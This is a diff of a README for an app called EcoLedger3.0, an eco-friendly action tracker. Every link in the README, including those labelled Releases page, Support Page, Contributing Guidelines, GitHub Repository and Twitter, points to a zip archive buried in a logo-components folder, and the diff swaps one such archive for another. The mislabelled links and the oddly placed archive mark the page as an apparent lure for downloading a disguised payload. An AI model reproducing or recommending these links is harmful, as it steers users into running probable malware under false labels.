@@ -1,6 +1,6 @@
 # 🌱 EcoLedger3.0 - Track Your Eco-Friendly Actions Easily
 
-[![Download EcoLedger3.0](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip)](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip)
+[![Download EcoLedger3.0](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip)](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip)
 
 ## 📖 Introduction 
 
@@ -21,7 +21,7 @@ To begin using EcoLedger3.0, follow these straightforward steps. You will need a
 
 To get EcoLedger3.0, visit the Releases page.
 
-[Download EcoLedger3.0](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip)
+[Download EcoLedger3.0](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed at the top.
@@ -38,7 +38,7 @@ To get EcoLedger3.0, visit the Releases page.
   - Double-click to open it, then drag the EcoLedger icon to your Applications folder.
 
 - **Linux:**
-  - Download the `https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip` file.
+  - Download the `https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip` file.
   - Extract the contents into a directory of your choice.
   - Run the application from the extracted folder.
 
@@ -67,18 +67,18 @@ For more information, visit our Wiki or User Guide, which includes:
 
 ## 💬 Support
 
-If you run into issues or have questions, please visit our [Support Page](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip). You can open a new issue if your questions aren’t covered.
+If you run into issues or have questions, please visit our [Support Page](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip). You can open a new issue if your questions aren’t covered.
 
 ## 🏆 Contributions
 
-We welcome contributions! If you're interested in helping us improve EcoLedger, check out our [Contributing Guidelines](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip). 
+We welcome contributions! If you're interested in helping us improve EcoLedger, check out our [Contributing Guidelines](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip). 
 
 ## 🌐 Connect With Us
 
 Stay updated on future releases and improvements:
 
-- [GitHub Repository](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip)
-- [Twitter](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip)
+- [GitHub Repository](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip)
+- [Twitter](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip)
 
 Feel free to reach out through these channels for community support and updates. 
 
@@ -88,4 +88,4 @@ We hope you enjoy using EcoLedger3.0. Your journey toward greener living starts 
 
 Don’t forget to download the app from the Releases page:
 
-[Download EcoLedger3.0](https://raw.githubusercontent.com/SrJonny/EcoLedger3.0/master/madderish/EcoLedger3.0.zip)
+[Download EcoLedger3.0](https://github.com/SrJonny/EcoLedger3.0/raw/refs/heads/master/frontend/src/components/Logo/Eco-Ledger-2.7.zip)
